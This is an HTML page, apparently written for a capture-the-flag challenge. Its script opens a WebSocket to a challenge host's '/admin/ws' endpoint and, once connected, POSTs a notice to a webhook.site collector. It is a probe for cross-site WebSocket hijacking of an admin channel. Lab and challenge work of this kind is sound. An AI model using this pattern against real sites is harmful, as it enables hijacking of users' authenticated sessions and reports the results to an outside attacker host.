<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebSocket Debugging</title>
</head>
<body>
    <h1>WebSocket Connection Debugging</h1>

    <script>
        // Create a new WebSocket connection to /admin/ws
        const socket = new WebSocket('ws://ce441-web.spchallenge.ir:8080/admin/ws');

        // Event handler for when the WebSocket is open
        socket.onopen = function() {
            console.log('WebSocket connected');
            
            // Send a POST request to the webhook upon WebSocket connection
            sendPostToWebhook();
        };

        // Event handler for WebSocket errors
        socket.onerror = function(error) {
            console.error('WebSocket Error:', error);
        };

        // Event handler for WebSocket closure
        socket.onclose = function() {
            console.log('WebSocket closed');
        };

        // Function to send a POST request to the webhook
        function sendPostToWebhook() {
            console.log('Sending POST request to Webhook');
            fetch('https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    feedback: 'WebSocket connection established'
                })
            })
            .then(response => response.json())
            .then(json => console.log('POST request sent successfully:', json))
            .catch(error => console.error('Error sending POST request:', error));
        }
    </script>
</body>
</html>
